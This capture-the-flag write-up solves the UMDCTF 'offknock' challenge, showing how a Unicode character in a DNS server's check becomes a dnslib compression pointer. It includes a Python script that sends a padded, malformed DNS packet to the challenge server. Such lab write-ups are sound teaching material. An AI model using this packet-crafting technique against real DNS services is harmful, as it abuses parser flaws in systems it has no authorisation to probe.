# offknock

**Category:** Misc / Networking | **Difficulty:** Easy

* **Description:** "I hope my knockoff is good. nc challs.umdctf.io 32324"
* **Provided Files:** `dns_server.py`

## Initial Analysis
The challenge provides the source code for a custom DNS server written in Python using the `dnslib` library. The server operates over a TCP wrapper (taking a 2-byte length prefix followed by the payload) and forwards the query to a local UDP DNS server running on port 1337.

Looking at the core resolver logic:
```python
def resolve(self, request, handler):
    reply = request.reply()
    question = request.get_q()

    if question.qtype != QTYPE.TXT:
        reply.header.rcode = RCODE.reverse['NXDOMAIN']
        return reply

    if '\x04flag\x06market\x03polȳ'.encode('utf8') in handler.request[0][12:30]:
        reply.add_answer(RR("flag.market.polȳ", QTYPE.TXT, rdata=TXT(flag)))
    else:
        reply.header.rcode = RCODE.reverse['NXDOMAIN']

    return reply
```

To get the flag, our DNS request must meet two conditions:
1. The question type must be `TXT`.
2. The raw bytes of the packet, from offset 12 to 30 (exactly where the DNS Question Name section starts), must match the UTF-8 encoded string `\x04flag\x06market\x03polȳ`.

## The Vulnerability: UTF-8 and DNS Compression Pointers
At first glance, this looks like a simple string check. However, the catch lies in the character `ȳ` (Latin Small Letter Y with Macron). 

Because `ȳ` is a non-ASCII character, `.encode('utf8')` translates it into exactly two bytes: **`\xc8\xb3`**. 

This means the server expects the following raw bytes starting at offset 12:
`\x04flag\x06market\x03pol\xc8\xb3`

**The DNS Parsing Trap:**
DNS domain names are formatted as a sequence of length-prefixed labels.
* `\x04` -> read 4 bytes (`flag`)
* `\x06` -> read 6 bytes (`market`)
* `\x03` -> read 3 bytes (`pol`)

The very next byte parsed by `dnslib` is `\xc8`. In the DNS protocol, if the top two bits of a length byte are `11` (which is `0xC0` in hex), it is not treated as a length, but as a **compression pointer** to another offset in the packet.

Let's look at `\xc8` in binary: `1100 1000`. The top two bits are `11`!

The `dnslib` parser treats `\xc8\xb3` as a pointer. The exact offset is calculated using the lower 6 bits of the first byte and the entire second byte:
* `0xC8B3 & 0x3FFF = 0x08B3`
* `0x08B3` in decimal is **2227**.

## Exploitation Strategy
If we just send a standard 30-byte DNS packet containing the required string, the `dnslib` parser will hit the pointer, attempt to jump to offset `2227`, realize the packet is too short, and throw an out-of-bounds exception. The server will crash *before* it ever reaches the custom string check.

To exploit this, we must craft a perfectly malformed, extra-large DNS packet:
1. **Header:** Standard 12-byte DNS header.
2. **Target Bytes:** Inject the required byte sequence (`\x04flag\x06market\x03pol\xc8\xb3`) directly after the header.
3. **Padding:** Pad the packet out to at least 2228 bytes.
4. **Pointer Termination:** Place a null byte (`\x00`) exactly at offset `2227`. When `dnslib` jumps to this offset, it will hit the null byte, interpreting it as an empty label (the end of the domain name), and successfully finish parsing without crashing.

## Exploit Script
Here is the Python script to build the payload, handle the TCP wrapper, and extract the flag.

```python
import socket
import re

def solve():
    # 1. Craft the standard DNS header (12 bytes)
    # Transaction ID: 0x1337, Flags: 0x0100 (Standard query), 1 Question
    header = b"\x13\x37" + b"\x01\x00" + b"\x00\x01" + (b"\x00\x00" * 3)

    # 2. Craft the Question section exactly as requested by the server
    # 'ȳ' encodes to \xc8\xb3 in UTF-8
    qname = b"\x04flag\x06market\x03pol\xc8\xb3"
    qtype_class = b"\x00\x10\x00\x01" # QTYPE: TXT (16), QCLASS: IN (1)
    
    payload = header + qname + qtype_class

    # 3. Pad the payload to satisfy the DNS pointer targeting offset 2227 (0x08b3)
    target_offset = 2227
    padding_length = target_offset - len(payload)
    
    # Fill with null bytes up to index 2226, then put \x00 at 2227 to terminate the domain
    payload += (b"\x00" * padding_length) + b"\x00"

    # 4. Prepend the 2-byte length wrapper expected by the challenge's TCP proxy
    length_prefix = len(payload).to_bytes(2, 'big')
    final_data = length_prefix + payload

    print(f"[*] Sending malformed DNS payload ({len(final_data)} bytes)...")

    # 5. Connect, send, and parse the response
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('challs.umdctf.io', 32324))
        s.sendall(final_data)
        
        # Read the 2-byte response length
        resp_len_bytes = s.recv(2)
        if not resp_len_bytes:
            print("[-] Connection closed.")
            return
            
        resp_len = int.from_bytes(resp_len_bytes, 'big')
        resp_data = s.recv(resp_len)
        
        # Extract the flag from the TXT record
        match = re.search(b'(UMDCTF{.*?})', resp_data)
        if match:
            print("[+] Success!")
            print("[!] FLAG: ", match.group(1).decode('utf-8'))
        else:
            print("[-] Flag not found in response.")

if __name__ == "__main__":
    solve()
```

## Conclusion
This was a brilliant challenge that highlighted the danger of mixing text encodings with strict binary protocol parsing. By understanding how DNS compression pointers work at the bitwise level, we were able to turn a seemingly innocent Unicode character into a controlled parser jump, bypassing the crash and satisfying the server's checks.
